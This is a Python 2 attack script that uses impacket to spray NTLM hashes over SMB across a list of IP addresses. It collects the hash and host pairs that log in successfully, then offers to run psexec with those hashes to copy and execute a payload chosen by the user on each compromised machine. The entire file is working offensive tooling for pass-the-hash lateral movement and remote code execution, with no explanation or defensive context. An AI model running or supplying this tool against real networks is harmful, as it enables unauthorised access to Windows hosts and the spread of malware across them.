#!/usr/bin/python
import psexec
import time
import blessings
import sys
import re
import argparse
import signal
from impacket.smbconnection import *

class timeout:
    def __init__(self, seconds, error_message='Timeout'):
        self.seconds = seconds
        self.error_message = error_message
    def handle_timeout(self, signum, frame):
        raise Exception(self.error_message)
    def __enter__(self):
        signal.signal(signal.SIGALRM, self.handle_timeout)
        signal.alarm(self.seconds)
    def __exit__(self, type, value, traceback):
        signal.alarm(0)

t = blessings.Terminal()

parser = argparse.ArgumentParser(description='Spray Smb Hashes and Psexec')
parser.add_argument("-hashfile", help="Parse Hashes from a File (Hashes Seperated by New Line)")
parser.add_argument("-ipfile", help="Parse IP's from a File (IP's Seperated by New Line)")
parser.add_argument("-username", help="Set Username")
parser.add_argument("-workgroup", help="Set WorkGroup")
parser.add_argument("payloadpath", help="Select Payload for Psexec")
args = parser.parse_args()

hashfile = False
ipfile = False
targetsprayhash = []
targetipseperated = []
targetpassword = None
workinghashes = []
command = ""
path = ""
exeFile = args.payloadpath
copyFile = ""

print t.bold_green + "[*] Chosen Payload: " + t.normal + exeFile
if not args.hashfile:
    targethash = raw_input("[*] Enter Hashes Seperated by Comma: ")
    targetsprayhash = targethash.split(",")
else:
    hashfile = True
    print t.bold_green + "[*] Hash File Selected: " + t.normal + args.hashfile
    file = open(args.hashfile,"r")
    for hash in file:
        targetsprayhash.append(hash.strip("\n"))

if not args.ipfile:
    targetips = raw_input("[*] Enter IP's Serperated by Comma:")
    targetipseperated = targetips.split(',')
else:
    ipfile = True
    print t.bold_green + "[*] IP File Selected: " + t.normal + args.ipfile
    file = open(args.ipfile,"r")
    for ip in file:
        targetipseperated.append(ip.strip("\n"))


if not args.username:
    targetusername = raw_input("[*] Enter Username: ")
else:
    targetusername = args.username
if not args.workgroup:
    targetdomain = raw_input("[*] Enter Domain: ")
else:
    targetdomain = args.workgroup

for ip in targetipseperated:
    for hash in targetsprayhash:
        targetlm, targetnt = hash.split(':')
        print t.green + "[*] NT:LM Hash: " + t.normal + hash.strip(' ') + "," + ip
        try:
            with timeout(8):
                smb = SMBConnection(ip, ip, sess_port=445)
        except Exception as E:
            print t.bold_red + "[!!] Timed Out!" +t.normal
            print E
            continue
        try:
            smb.login(user=targetusername, password=targetpassword,
                      domain=targetdomain, lmhash=targetlm, nthash=targetnt)
            print t.bold_green + "[!] This Hash Worked - " + smb.getServerName() + t.normal
            workinghashes.append(hash + "," + ip)
        except:
            print t.bold_red + "[!] This Hash Failed" + t.normal

print t.green + "\n[*] Working Hashes:"
for hash in workinghashes:
    print t.bold_green + hash + t.normal

try:
    want_to_psexec = raw_input("[*] Run Psexec on Working Hashes? [Y/n]: ")
except:
    sys.exit(0)
if want_to_psexec.lower() == "y" or want_to_psexec == "":
    for hash in workinghashes:
        psexechash,psexecip = hash.split(",")
        PSEXEC = psexec.PSEXEC(command, path, exeFile, copyFile, protocols=None, username=targetusername,
                               hashes=psexechash, domain=targetdomain, password=targetpassword, aesKey=None, doKerberos=False)
        print t.bold_green + "\n[*] Starting Psexec...." + t.normal
        try:
            PSEXEC.run(psexecip)
        except SessionError:
            print t.bold_red + "[*] Clean Up Failed, Remove Manually with Shell"
else:
    print t.bold_green + "[*] Done." + t.normal
    sys.exit(0)
